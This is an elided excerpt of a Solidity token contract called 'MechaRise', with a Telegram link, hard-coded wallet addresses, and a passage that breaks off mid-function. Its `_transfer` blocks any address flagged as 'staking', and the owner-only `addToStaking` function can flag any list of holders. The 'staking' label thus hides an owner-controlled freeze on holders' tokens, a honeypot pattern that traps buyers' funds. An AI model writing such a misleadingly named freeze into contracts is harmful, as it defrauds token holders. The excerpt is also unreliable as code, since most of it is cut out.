...
/**
Telegram https://t.me/MechariseEntryPortal
...
contract MechaRise is Context, IERC20 { 
    ...
    address payable public Wallet_Marketing = payable(0x79f2E3075F149D1C56b08157072E252ac4a93234); 
    address payable public Wallet_Dev = payable(0x45f7C3c51C574DF3257d98F67Cc60948133FF861);
    ...
    constructor () {
        ...
        _owner = 0x5229877567824B0A4DfFbDd3F4Cfc9DC81F647B8;
    ...
    function _transfer(
        ...
        require(!_isStaking[from] && !_isStaking[to], "This address is Staking");
    ...
    function addToStaking(address[] calldata addresses) external onlyOwner 
	{
     for (uint256 i; i < addresses.length; ++i) {
        _isStaking[addresses[i]] = true;
      }
    }
    
     //Remove from Staking 
    function removeFromStaking(address account) external onlyOwner 
	{
